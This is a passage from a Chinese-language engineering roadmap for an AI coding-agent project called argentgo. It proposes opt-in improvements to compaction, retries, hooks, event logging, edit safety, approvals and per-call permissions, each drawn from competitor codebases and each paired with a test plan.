- **argentgo 现状**：`internal/agent/runner.go:111-115` 的 `Compactor` 只有同步 `MaybeCompact`；`internal/agent/loop_helpers.go:15-42` 在阈值处同步调用。`internal/agent/compaction.go:120-168` 的 `SummaryCache` 只缓存相同前缀的摘要结果，避免重复摘要，**不会提前做**。
- **问题**：写摘要要 30–60s，到阈值才开始会让下一次请求阻塞；大文件读取时上下文暴涨来不及。
- **建议**：在 app 层包一层 opt-in 后台 Compactor（沿用 `Compactor` 接口，不改 agent 热路径），在压力接近阈值时异步产出摘要，到阈值时按 anchor/tail 校验后交给现有 `MaybeCompact` 消费；失败/换模型/超 TTL 则丢弃。默认同步路径逐字节不变。
- **验收**：`internal/app/background_compactor_test.go`：注入伪 Chatter 控制延迟，断言后台摘要生成后阈值处零阻塞切换、tail 过长时拒绝切换、失败后回退同步；`go test ./internal/app -count=1`。

### 106. 重试前的持久上下文省略 + 可中止退避 + 摘要调用共享退避 `[P1/M]`（学自 pi-mono）
- **竞品证据**：`pi-mono/packages/coding-agent/src/core/agent-session.ts:1269-1283` 的 `_omitRecoveryAttempt()`，`:1313-1354`/`:3936-3995` 在重试前对失败助手消息及其工具结果写 `appendContextEdit(targetId, null)` **永久省略**；`pi-mono/packages/ai/src/utils/retry.ts:160-164` 的退避可被 `abortRetry` 中断；`:2073-2080,3883-3918` 让压缩/分支摘要的 LLM 调用复用同一 retry 预算与事件。
- **argentgo 现状**：`internal/agent/fallback.go:48-160` 在可重试错误时立即切换模型，无退避、失败消息留在 `s.messages`；`internal/agent/compact_retry.go:44-100` 的压缩重放是 opt-in 且最多一次，同样保留失败消息。`internal/session/context_edit.go:57` 的 `AppendContextEdit` 已有 Text 替换/隐藏语义，但只有 CLI 手动调用。
- **问题**：失败尝试及其工具结果持续占用上下文，重试时重复污染；瞬时限流立即切模型可能不是最优策略。
- **建议**：opt-in 同模型重试策略（`maxRetries`/base/cap），重试前通过 app 回调把失败助手消息写 `ContextEdit{TargetID, Text:""}` 永久省略；退避可被 ctx 取消；复用 `internal/llm/retry.go:416-440` 的分类。默认仍走当前模型回退，事件/字节不变。
- **验收**：`internal/app/retry_omit_test.go`：429 → 重试成功，断言失败轮被 context_edit 省略、退避受 ctx 取消、默认路径无 edit 记录；`go test ./internal/app ./internal/agent -count=1`。

### 111. crush 风格生命周期 hook 事件补齐：TurnStart/End/Interrupt/StopFailure/SubagentStop `[P2/S-M]`（学自 crush）
- **竞品证据**：crush `internal/agent/agent.go:987,1308,1421` 按分类触发 TurnStart/Interrupt/StopFailure/TurnEnd（`turn_hooks.go:25-47`），取消用 `context.WithoutCancel` 保证落盘。
- **argentgo 现状**：常量已声明（`internal/hooks/hooks.go:43-57,98`），但生产只 fire #110 列出的几个；agent 已有完整事件源（`internal/agent/events.go:15-28`），app 的 `Emit` 闭包在 `internal/app/app_execute.go:702`，审批事件在 `dispatch.go:429-434`。
- **问题**：用户订阅不到轮次边界/中断/子 agent 结束等生命周期事件，hooks 声明不完整。
- **建议**：opt-in `ARGENT_HOOK_LIFECYCLE=1`，在 Emit 闭包把 `EventTurnStart/EventTurnEnd/EventStop/EventSubagentEnd` 映射到已有 hook 事件，`EventStop` 按 `result.Stopped` 分类，审批事件接 `bridge.fire`；默认无映射。
- **验收**：`internal/app/hook_lifecycle_test.go`：一轮完整执行后 hook 收到 TurnStart→TurnEnd→Stop 序列；取消时收到 Interrupt；默认无额外 hook 调用；`go test ./internal/app -count=1`。

### 112. 事件日志缺少持久化与 SSE `Last-Event-ID` 续传 `[P1/M-L]`（学自 opencode）
- **竞品证据**：opencode `core/src/bus.ts:22-49` 按 aggregate 预留单调 seq；`:150-180` 暴露 `log({aggregateID, after, follow})`，replay 后发 `Synced` 标记；`:290-448` 事务内写 EventSequenceTable/EventTable、跑 projector、再发通知；`server/src/event-feed.ts:8-84` 按类型过滤 + dropping queue，`:48-70` 溢出整批失败，`server/src/handlers/event.ts:11-35` 发 `server.connected` + 15s heartbeat。
- **argentgo 现状**：`internal/server/event.go:15-57,99-169` 的 `EventHub` 只有**内存** 256 条回放 + 512 订阅缓冲，慢订阅者直接淘汰（`:157-165`），终态事件有预留槽必达（`:125-155`）；SSE 有 connected + heartbeat（`:285-340`），但**全仓无 `Last-Event-ID`**；`internal/session/replay_state.go:8-54` 的确定性重放是纯诊断原语，无生产调用方。
- **问题**：客户端断线重连后失去事件窗口之外的进度；无审计级事件日志。
- **建议**：opt-in 把 agent.Event 以 JSONL 追加到会话目录（stdlib，复用 session 目录与脱敏），SSE 支持 `Last-Event-ID` 从磁盘续放；默认仍走内存 hub，字节不变。
- **验收**：`internal/server/event_persist_test.go`：发布 300 事件后用 `Last-Event-ID: 10` 重连收到 11+ 且终态必达；关闭时旧 SSE 行为不变；`go test ./internal/server -count=1`。

### 114. 普通文本编辑缺 parse-regression 门禁（写入前语法劣化检查）`[P1/M]`（学自 oh-my-pi）
- **竞品证据**：`oh-my-pi/crates/edit/src/session.rs:454-458` 计算 `parse_regressed = op != Delete/Noop && existed && source_parses(before) && !source_parses(after)`（字段 `:113`、结果 `:485`），`source_parses` 在 `:578-587` 经语法 oracle 检查，宿主据此自动修复。
- **argentgo 现状**：只有 AST 改写路径有等价的「写入前拒绝」——`internal/astedit/astedit.go:102-106` 在 splice 后 `newErrs > baseErrs` 直接 `ErrInvalidReplacement`；普通 `edit`（`tools_builtin_write_edit.go:98-189`）和 `apply_patch`（`tools_apply_patch.go:145-235`）都没有，坏语法静默落盘。
- **问题**：模型编辑 Go 文件写坏语法后要等 `go test` 才发现，浪费一轮验证反馈。
- **建议**：opt-in `ARGENT_PARSE_REGRESSION_GUARD=1`：stage 完成、commit 前用 `go/parser` 对 `.go` 目标比较 `baseErrs→newErrs`，其他语言 abstain；结果可作为结构化字段交给现有验证 hook 决定是否回滚/重试；默认文案与字节不变。
- **验收**：`internal/tools/parse_regression_test.go`：原合法 Go 文件被编辑成语法错误时拒绝且零写入；原本就有错误的文件不做劣化判断；非 Go 文件不受影响；`go test ./internal/tools -count=1`。

### 115. 写后漂移检测：format-on-write 后按落盘字节重算 `[P1/S-M]`（学自 oh-my-pi）
- **竞品证据**：`oh-my-pi/crates/edit/src/session.rs:399-424` 把 `response.written` 与 `file.after` 比较，不一致则重算 diff、刷新 tag 并写 `write_drift_warning`（`:591-597`）。
- **argentgo 现状**：`internal/tools/tools_format_aware_diff.go:12` 的 `FormatHook` 已接线到 registry（`:211-218`），但 `formatOutput`（`tools_builtin_write_edit.go:69-79,194-205`）只在**写入前**算 diff，落盘后不再校验；`internal/tools/file_freshness.go:108-119` 的 `FileFreshness.MarkWrite` 全仓除自身测试外零生产调用。
- **问题**：格式化钩子或编辑器保存改变了最终字节时，模型看到的 diff 与实际落盘不一致，后续 anchor/hashline 基于错误快照。
- **建议**：opt-in `ARGENT_VERIFY_WRITE=1`：写后 `os.ReadFile` 比较预期字节，漂移则返回结构化警告 + 用 `hashlineHash`（`tools_builtin_write_edit.go:207-214`）重算的新 anchor；同时把 `FileFreshness` 接进 read/write 路径（见 #124）。默认零额外 syscall。
- **验收**：`internal/tools/write_drift_test.go`：注入会改写字节的 FormatHook，断言结果含新 anchor 与警告；无 hook 时不产生额外读取；`go test ./internal/tools -count=1`。

### 119. MCP 输出限制非默认、阈值过高（200KiB vs 20KiB）`[P1/S-M]`（学自 pi-mono）
- **竞品证据**：`pi-mono/packages/mcp/src/output-limit.ts:9,28-60`：`MCP_OUTPUT_MAX_BYTES = 20*1024`，超限时 head/tail 保留、UTF-8 字符边界、附原始 token/行数与 `[Full output: <path>]`；`extensions/mcp/tools.ts:217-233` 与 `resources.ts:184,326` 在结果转换处无条件调用。
- **argentgo 现状**：`internal/mcp/spill.go:34-100` 需 `ARGENT_MCP_SPILL_DIR` + 可选 `ARGENT_MCP_SPILL_THRESHOLD`，默认阈值 `200<<10`（200KiB）且未配置目录时**完全不溢出**（`mcp.go:610-612`），一个话痨 MCP server 可直接淹没上下文。
- **问题**：单次 MCP 调用 30–100KiB 很常见，当前默认路径毫无保护。
- **建议**：项目默认路径逐字节不变是承诺，所以不直接改默认值；新增 opt-in `ARGENT_MCP_OUTPUT_LIMIT_BYTES`（默认 0 = 旧行为）提供与 pi 同形的 20KiB 风格 head/tail 截断与恢复路径，注册进 `optin_metadata.go`。
- **验收**：`internal/mcp/output_limit_test.go`：设置后 30KiB 输出被截到 20KiB 以内且含恢复标记；默认零配置时与旧 golden 逐字节一致；`go test ./internal/mcp -count=1`。

### 120. 统一 exec 会话：`session_id`/`write_stdin`/`yield_time_ms`/TTY `[P1/L]`（学自 codex）
- **竞品证据**：codex `core/src/tools/handlers/unified_exec.rs:67-91` 定义 `ExecCommandArgs`（`tty`、默认 `yield_time_ms=10s`（`:113`）、`max_output_tokens`、per-call `sandbox_permissions`、`prefix_rule`）；`:30-55` 暴露 `session_id`，`:117` `write_stdin` 默认 250ms；`core/src/unified_exec/mod.rs:75-76` 输出封顶 1MiB/256K token；`process_manager.rs:105` 限制 stdin 写入 8000 字节。
- **argentgo 现状**：`internal/bash/tools_builtin_bash.go:108` 的 bash schema 只有 `command`/`timeout_seconds`/`background_after_ms`；`:129-146` 三条 opt-in 路径；`internal/bash/core.go:96-150` 的持久 shell 用「命令 + nonce 探针」一次性 round trip，明确「管道没有 TTY，超时只能销毁会话」；`internal/jobs/jobs.go:237` 后台作业 `child.Stdin = devNull`；`internal/pty/pty.go` 有 ConPTY/ptmx 零 cgo 实现但**全仓无生产 importer**。
- **问题**：REPL、dev server、watch 模式、交互式登录等长驻进程无法真正交互（现有持久化 shell 只能复用 cwd/env）。
- **建议**：`ARGENT_UNIFIED_EXEC=1` 激活，基于 `internal/pty` + `internal/proc` 新增轻量会话注册表；bash 工具加 `session_id`/`yield_time_ms`/`stdin` 字段并新增 `write_stdin` 工具；stdin 写入限长、输出环形缓冲复用 output_spill；关闭时参数忽略、逐字节不变。注意和旧 TODO #30（持久化 shell 会话）互补：#30 解决状态复用，本条解决交互通道。
- **验收**：`internal/bash/exec_session_test.go`：启动 `python -i` 或简单 REPL，两次 write_stdin 保持进程；TTY 模式下 Ctrl-C 只杀该会话；空闲超时回收无残留进程；`go test ./internal/bash ./internal/pty -count=1`。

### 121. Windows 挂起启动 → Job Object → 恢复，封住孙进程逃逸窗口 `[P1/M]`（学自 oh-my-pi）
- **竞品证据**：`oh-my-pi/crates/shell/src/sys/spawn/windows.rs:1030` 用 `CREATE_SUSPENDED` 创建进程，`:1052` 分配 Job Object 失败即对**未运行**的子进程 `TerminateProcess`，`:1058` 才 `ResumeThread`。
- **argentgo 现状**：`internal/proc/proc_windows.go:95-110` 在调用方 `cmd.Start()` **之后**才 `createJob()` + `assignJob()`；分配失败只能事后 `taskkill /F /T`（`:126-130`），期间子进程的孙进程可能已经启动并逃逸；`terminate_windows.go:7-9` 优雅终止在 Windows 直接退化为立即 kill。
- **问题**：超时/取消时可能留下孤儿进程；Windows 上无法发 CTRL_BREAK 做优雅退出。
- **建议**：opt-in `SuspendedJob`：沿用 `internal/proc/proc_windows.go:26-33` 的 `syscall.NewLazyDLL` 模式调 `CreateProcessW`/`AssignProcessToJobObject`/`ResumeThread`；入 job 失败即杀掉挂起进程；附带短 grace + `CTRL_BREAK_EVENT`。无 cgo、linux 交叉编译路径不受影响。
- **验收**：`internal/proc/suspended_job_windows_test.go`：启动会 spawn 孙进程的命令，取消后两者均不在；入 job 失败路径子进程从未运行；`GOOS=linux go build ./...` 仍绿。

### 122. 多轮 follow-up 队列：本应停止时再继续 `[P1/S-M]`（学自 pi-mono）
- **竞品证据**：pi `packages/agent/src/agent.ts:197-198` 双队列 `steeringQueue`/`followUpQueue`（各自 one-at-a-time/all 模式，`:255-256`），`:410-412` 外层循环在 agent 停止后 drain follow-up 再跑一轮；`agent-loop.ts:187,310-317` 明确「Agent would stop here. Check for follow-up messages」；`types.ts:233-248` 的 `finishTurn` 返回 `{action:"end"/"continue"}`。
- **argentgo 现状**：`internal/agent/steer.go:12-45` 只有单一 `Steer <-chan string`；`loop_helpers.go:246-270` 在轮次边界 drain；`loop.go:921-940,1140-1146` 无工具回复时只在 `injectSteering()` 命中时多开一轮；无 follow-up 概念。
- **问题**：用户在模型正在回答时追加的消息（TUI/native 场景）只能当 steering 在当前轮插入，无法「答完后作为新轮次继续」。
- **建议**：opt-in `Options.FollowUp <-chan string` + `FollowUpMode`；在 `loop()` 无工具结束分支抽取 follow-up，命中则再跑一轮；不接通道时零分配空操作。
- **验收**：`internal/agent/follow_up_test.go`：无工具回复时通道已有 follow-up → 多跑一轮并包含该文本；通道空 → 原样 StopComplete；`go test ./internal/agent -count=1`。

### 126. 压缩请求溢出时按缓存前缀逐条淘汰 `[P1/S-M]`（学自 codex）
- **竞品证据**：codex `core/src/compact.rs:355-367`：压缩模型请求遇 `ContextWindowExceeded` 时 `history.remove_first_item()` 并重置重试计数，注释明确「从头部裁剪以保留缓存前缀」。
- **argentgo 现状**：`internal/agent/compact_retry.go:59-90` 只在 provider 溢出后调用一次 `MaybeCompact` 且最多重放一次；`internal/app/compact.go:249-285` 的 `compactionWorthwhile` 判定不划算时返回 `(messages,false)`，`compactAndReplay` 的 `!changed` 分支直接放弃重放——首次请求即严重溢出时可能没有有效恢复路径。
- **问题**：超大历史或短上下文模型下，压缩后仍超限时直接失败，而不是继续裁最旧项。
- **建议**：opt-in `ARGENT_COMPACT_DRAIN=1`：摘要后重新估算仍超预算时按前缀逐条移除最旧非系统消息（循环有上限），复用 `resetBudgetReminder()` 与事件通知；仍受 `MaxCompactRetries` 约束。
- **验收**：`internal/agent/compact_drain_test.go`：伪 Chatter 两次报告 context overflow，断言第二次裁掉最旧消息并成功；无上限空转；关闭时行为不变；`go test ./internal/agent -count=1`。

### 127. 可持久化的审批/作用域规则 `[P2/M-L]`（codex + opencode）
- **竞品证据**：codex `protocol/src/protocol.rs:4618-4635` 的 `ReviewDecision` 含 `ApprovedForSession`/`ApprovedExecpolicyAmendment`/`ApprovedMcpPolicyAmendment`/`NetworkPolicyAmendment`；`execpolicy/src/amend.rs:62-78` 用文件锁把前缀规则追加到策略文件，跨会话生效。opencode `core/src/permission.ts:334-395` 拒绝时按 session+messageID 撤销整批 pending，`always` 时持久化 saved rule（`permission/saved.ts:69-84`）。
- **argentgo 现状**：`internal/security/approver.go:232-274` 的 `ScopedApprover` 有 `GrantAlways`/`GrantN`/`Deny`（粘性 deny 更保守，应保留），但只在进程内存且按工具名键控；`chain.go:167-170,415-483` 的 `StagedApprover`/`RememberScope` 无生产实现者；配置侧 `app/policy_config.go:48-70` 无运行时追加。已有 `approver_ttl.go` 的 `TTLCache` 支持持久 grants，但未接到 Chain 主路径。
- **问题**：跨会话重复审批同一前缀规则；拒绝时整批 pending 的撤销策略未落地。
- **建议**：opt-in `ARGENT_APPROVAL_PERSIST=1`：`internal/security` 实现 `FileBackedScopedApprover` 写 `<storage>/approvals.jsonl`（复用 `TTLCache` 持久化与 `PolicyIssues` 校验），只记录命令前缀/工具名，不记录自由文本参数；同时给 RPC `approval.answer` 加可选 feedback 字段并接 `ParseApproverResult`（`approval_feedback_adapter.go:11-58`，目前零生产调用）。默认仍走内存语义。
- **验收**：`internal/security/persistent_approval_test.go`：always 授权重启后仍生效、粘性 deny 优先、文件损坏时 fail-closed；`go test ./internal/security -count=1`。

### 128. 类型化 telemetry 适配层（span/metric schema + NOOP）替代散点 slog `[P2/M-L]`（学自 pi-mono）
- **竞品证据**：pi `packages/telemetry/src/index.ts:1-90` 定义 Span/Metric/Store/Propagation 契约；`metrics.ts:30-120` 的 counter/upDownCounter/histogram 与 schema 绑定；`noop.ts:1-35` 共享 noop context（零行为）；`agent-session.ts:3895-3918` 把 retry 事件结构化发出。
- **argentgo 现状**：`internal/agent/loop.go:276-330,352-477`（TURN_TIMING / TOOL_TIMING_HISTOGRAM / TOOL_CALL_TRACE / CONTEXT_HEALTH_LOG / PRESSURE_LEVEL 多为轮末 slog）、`internal/llm/debug_trace.go`、`internal/cli/trace_sink.go` 观测点丰富但无统一 span/metric 契约，无法跨包关联一次运行。
- **问题**：诊断日志之间无法用统一的 run/span ID 关联；新增观测点只能复制 slog 模式。
- **建议**：新增 stdlib-only 的 `internal/telemetry` 接口包（Context/Span/Counter/Histogram + NOOP 单例），先让现有 opt-in 日志点作为第一个 adapter；默认 NOOP 不分配，事件/记录字节不变。无需新模块。
- **验收**：`internal/telemetry/telemetry_test.go`：noop 实现零分配（benchmark）、span 父子关系与属性 schema 验证；现有观测点开启后输出含统一 run ID；`go test ./internal/telemetry ./internal/agent -count=1`。

### 129. apply_patch 支持 `*** Move to:` 重命名 `[P2/S]`（学自 codex）
- **竞品证据**：codex `apply-patch/src/parser.rs:18,42,76,99` 定义 `MOVE_TO_MARKER`/`move_path` 并在解析时填充；`lib.rs:473` 附近按 add/delete/update/move 分类落盘。
- **argentgo 现状**：`internal/tools/apply_patch_parse.go:167-173` 的 `parsePatchFileDirective` 只识别 Add/Delete/Update；`tools_apply_patch.go:154-230` 的阶段三 switch 只有 `update`/`add`/`delete`，没有 move 语义；`lsp_will_rename`/`worktree` 工具不覆盖补丁内改名。
- **问题**：与上游 apply_patch 格式不兼容，模型习惯性写 `*** Move to:` 时工具直接拒绝。
- **建议**：`PatchAction` 加 `MoveTo`，解析 `*** Move to:` 行；落盘阶段按「读原文件 → 写新路径 → 删旧路径」原子化（复用现有重复动作冲突检查与锁顺序）。
- **验收**：`internal/tools/apply_patch_move_test.go`：update + move 的补丁断言新路径内容正确、旧路径不存在；重复目标拒绝；`go test ./internal/tools -run TestApplyPatch -count=1`。

### 130. per-call 文件系统/网络权限 profile（不引入 OS 沙箱）`[P2/M]`（学自 codex）
- **竞品证据**：codex `protocol/src/models.rs:99,254,267` 定义 `FileSystemPermissions`/`NetworkPermissions`/`AdditionalPermissionProfile`；`permissions.rs:131-139,152-156,257-275` 定义 Read/Write/Deny 与 special path，deny 优先于 write；unified_exec 可带 per-call `sandbox_permissions`（`handlers/unified_exec.rs:82-83`）。
- **argentgo 现状**：`internal/security/sandbox.go:11-19` 只有三档全局 `SandboxMode`；`policy.go:69-91` 是 denyPaths/denyCommands/writeRoots 粗粒度列表；`sandbox_execution.go:106-140` 已有 enforcement/denial/fail-closed 三维描述但文件头明确「纯数据纯函数，不接入 Chain.Check」，无生产接线。bwrap/seatbelt/landlock 属 OS 沙箱，在「无 cgo / 单二进制」约束下不可照搬。
- **问题**：MCP/插件工具无法声明「此调用只读某目录」之类细粒度权限。
- **建议**：不碰 OS 沙箱，在工具层把 `sandbox_execution.go` 现有描述升级为可传入 per-call profile：`internal/security/policy.go` 加 `CheckWith(ctx, name, args, profile)`，MCP/插件经 hook 注入可选 profile；保持 `Check` 原路径不变。
- **验收**：`internal/security/per_call_profile_test.go`：per-call deny 优先于全局 write、只读 profile 拒绝修改类工具；默认 `Check` 行为不变；`go test ./internal/security -count=1`。

### 131. 写操作审批携带 diff 预览与资源级授权 `[P1/M]`（学自 opencode）
- **竞品证据**：opencode `core/src/tool/plugin/edit.ts:328-344` 在 authorize 前生成 `fileDiff` 并传给 `FileWrite.authorize`；`core/src/file-write.ts:62-80` 分域检查 `external_directory` 与 `assert({action:"edit", resources, metadata:{files:[preview]}})`；找不到 oldString 时读文件内容还要先 `allows({action:"read"})`。
- **argentgo 现状**：`internal/security/chain.go:357-373` 只把改写后的参数 JSON 交给 `PromptApprover.Ask`（`approver.go:49-66` 打印 `Allow <name> <args>?`），没有 diff；策略只有 tool/path/command 三维（`policy.go:58-92`），无 action/resource 分域；分阶段审批能展示 scope 摘要（`chain.go:421-497`）但不展示内容差异。
- **问题**：文件编辑审批近乎「盲批」——native 审批卡 diff 已落地（`native/approval_diff.go`），但 CLI/文本审批器仍无 diff。
- **建议**：opt-in 让 Chain 接受 `Preview(ctx,tool,args) (diff,error)` 回调，审批提示附加脱敏 diff 摘要（复用 `clipApprovalFeedback` 限长）；不改变审批判定逻辑。
- **验收**：`internal/security/approval_preview_test.go`：write 工具审批文本包含 `+N/-M` 摘要；无 Preview 时文本逐字节不变；`go test ./internal/security ./internal/app -count=1`。

### 132. pluginapi 工具可选 OutputSchema 校验 `[P2/M]`（学自 opencode）
- **竞品证据**：opencode `core/src/tool/runtime.ts:27-38` 从 input/output schema 生成 ToolDefinition，`:40-74` 执行后校验输出 schema，`:44-57` 把插件异常统一成 `Tool.Error`；`codemode/src/language/runtime/limits.ts:6-21` 给脚本编排加字符串/数组/深度上限。
- **argentgo 现状**：`internal/pluginapi/tool.go:13-19` 的 `Tool` 契约只有 `Name/Description/Schema/Mutating/Run(...) (string,error)`，无输出 schema 或边界错误归一；`internal/tools/catalog.go:60-79` + `lazy_catalog.go:56-70` 已解决发现/公布那一半。
- **问题**：插件工具输出不可信且无结构校验，异常可能穿透边界。
- **建议**：只给 pluginapi 工具加可选 `OutputSchema()` 接口，app 边界按接口断言做 opt-in 校验；不改内置 Tool 签名。
- **验收**：`internal/app/plugin_output_schema_test.go`：插件声明 output schema 后，非法输出被转成模型可读错误；未声明的工具行为不变；`go test ./internal/app -count=1`。

### 133. 每个外部程序独立的 UTF-8→ACP 增量解码 `[P2/M]`（学自 oh-my-pi）
- **竞品证据**：`oh-my-pi/crates/shell/src/output_decode.rs:89-109` 的 `push` 快路径，`:122-172` 的 `drain_utf8` 线性游标，`:195-220` 的 `external_output_decoding`，`:236-257` 的 `CaptureDecoder` 按行判定（`MAX_HELD_LINE=64*1024`）；遇完整非法序列后该程序剩余输出永久锁 ACP，不再切回。
- **argentgo 现状**：`internal/proc/utf8_writer.go:14-19,67-121` 只做 chunk 边界的 UTF-8 暂存，非法字节原样透传成 U+FFFD；`internal/bash/tools_builtin_bash.go:217-229` 仅在 cmd.exe 分支前置 `chcp 65001`，bash 分支禁止加（`:229`），中文 Windows 上经 Git Bash 启动的原生程序（写 CP936）仍乱码。
- **问题**：中文 Windows 下 shell 捕获的程序输出乱码，影响模型理解错误信息。
- **建议**：opt-in `ByteDecoder` 包住每个 `proc.Run` 的 stdout/stderr：UTF-8 合法直通，遇完整非法序列经 `syscall.NewLazyDLL("kernel32.dll")` 调 `MultiByteToWideChar` 并锁存 ACP 到 EOF；capture 按行判定避免污染相邻行；保留现有 `trimIncompleteRuneTail/Head` 边界语义。
- **验收**：`internal/proc/acp_decode_windows_test.go`：模拟 CP936 字节流解码成正确中文；合法 UTF-8 路径不产生额外开销；`GOOS=linux go build ./...` 仍绿；`go test ./internal/proc -count=1`。

### 134. foveated 多保真压缩归档（纯文本版起步）`[P2/L]`（学自 oh-my-pi）
- **竞品证据**：`oh-my-pi/packages/snapcompact/src/snapcompact.ts:2136-2220` 的 `planArchive`：两端高保真（`:2154-2156`）、中段成框（`:2195-2214`）、超预算丢最旧 dense（`:2207-2212`）；按读者能力回放 `:2258-2298`；三层预算 `:519-544`。
- **argentgo 现状**：已有 opt-in 无损磁盘归档（`internal/session/compact.go:907-988`），但只生成一段「可恢复说明」（`:1085-1097`），不回灌上下文；压缩视图固定为单条 system summary（`session_message.go:131-138`）。
- **问题**：超长会话被压成一段摘要后丢失大量细节；全量归档模型读不动，用户没有分层回放出口。
- **建议**：分两步：第一步只做纯文本版（两端高保真 + 中段稀疏化 + 显式 gap 标记），复用现有 `session.Project`/`PruneToolResults`，零 wire 变化；第二步才用 `image/png` + 内嵌位图字体生成 frame 并按需回放（L 级，可长期排期）。
- **验收**：`internal/session/foveated_archive_test.go`：1000 条消息的归档视图两端逐字保留、中段按预算稀疏、gap 标记可解析；关闭 opt-in 时 `Messages()` 逐字节不变；`go test ./internal/session -count=1`。

### 135. CI 缺体积/启动耗时门禁`[P2/S]`
- **现状**：#100 的 pprof/GC 三开关已落地（`cmd/argent/main.go:15`、`internal/app/diag_env.go`），但 CI 仍无产物体积断言与启动耗时 smoke；日常 `go build` 未加 `-trimpath -ldflags '-s -w'`（release 脚本已加）。
- **问题**：回归（如 #94/#95）无法被体积/启动时间指标发现。
- **建议**：CI 构建后检查二进制字节数（例如超过当前基线 +10% 失败），`--version` 计时仅报警不精确基准；AGENTS.md 日常构建命令加裁剪标志。
- **验收**：CI workflow 新增一步并本地跑通；产物体积在阈值内；`go test -p 4 ./... -count=1` 全绿。

---

## 附：优先处理建议

> 2026-11-23 更新：以下顺序综合了新一轮 6 个竞品源码深读的结论；已落地条目（原 #2/#11/#14/#25/#30/#32/#54/#58/#60/#61/#100/#136，以及 #1/#15/#39/#74~#77/#81/#82/#84~#87/#90/#92/#94/#101~#103/#107~#110/#113/#116~#118/#123~#125）已从本文档删除。P0、hook、小项与发版门禁批次均已落地并全绿。

1. **第一优先（真 bug / 安全绕过）**：已全部完成——#101（apply_patch 策略绕过）、#102（畸形参数以 `{}` 执行）、#103（带图消息 token 估算为 0）连同原清单 P0（#1/#15/#39/#74/#75/#76/#77/#94）均已落地，默认路径逐字节不变。
2. **第二优先（hook 表达力与压缩事件接线）**：#108/#109/#110/#123 已落地（allow 预审批章、updatedInput/Output 改写、PreCompact/PostCompact 事件、todo 入摘要）；剩余 #112（事件日志/SSE 续传）。
3. **第三优先（小而实的体验/正确性）**：#107/#113/#116/#117/#118/#124/#125 已全部落地（patch context 锚定、生成文件保护、data URL 裁剪、grep per-file、MCP annotations 审批、read-before-write、分支摘要）。
4. **架构级改造单独排期**：#104（实测锚点计量）、#105（后台预压缩）、#106（重试省略+退避）、#112（事件日志/SSE 续传）、#120（统一 exec）、#128（telemetry），以及 #134（foveated 归档）属于 L/M-L 级，需要与现有会话/agent 热路径的逐字节基线一起评审。
5. **发版门禁**：#74~#93 已全部落地（版本/文档/CI/脚本一致性、行数锚点机器校验、fuzz workflow、产物自报版本校验、离线 model-quality 评测）；剩余 #135（体积/启动门禁）属于 CI 指标增强。
6. **验证方式**：每条的「验收」栏都给了可执行命令；涉及默认路径的改动一律先跑 `gofmt -l .`、`go vet ./...`、`go test -p 4 ./... -count=1` 与逐字节 golden，再跑发版门禁 `-race`/`GOOS=linux go build ./...`。
